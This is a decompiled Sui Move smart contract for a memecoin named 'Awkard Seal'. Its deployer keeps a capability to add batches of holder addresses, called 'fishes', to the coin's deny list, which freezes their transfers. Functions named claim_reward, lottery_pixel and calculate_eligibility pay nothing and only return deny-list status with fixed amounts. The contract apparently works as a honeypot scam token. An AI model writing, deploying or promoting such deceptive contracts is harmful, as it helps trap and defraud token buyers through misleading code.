module 0x2babfd7dcfd371f6ed7721eca0525b29cf1cbd1c78404dd8d32bfb8f710610b1::awkard_seal {
    struct AWKARD_SEAL has drop {
        dummy_field: bool,
    }

    public fun add_fishes(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AWKARD_SEAL>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<AWKARD_SEAL>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun calculate_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64, u8) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 1000000000000000000, 9)
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    public fun claim_reward<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    fun init(arg0: AWKARD_SEAL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AWKARD_SEAL>(arg0, 9, b"AwkardSeal", b"Awkard Seal", b"Just an Awkard Seal", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/QmYWah6KFyYRLZzsX6Nf3MhDdmYaxTJijLdHtwTPmf5Ez6"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AWKARD_SEAL>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AWKARD_SEAL>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<AWKARD_SEAL>(&mut v3, 1000000000000000000, @0xf35edef05cfd65e27315b315abe8c5a171a51e5b9354c0261e7575d124dd2fd3, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AWKARD_SEAL>>(v3);
    }

    public fun lottery_pixel<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    public fun remove_fishes(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AWKARD_SEAL>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<AWKARD_SEAL>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

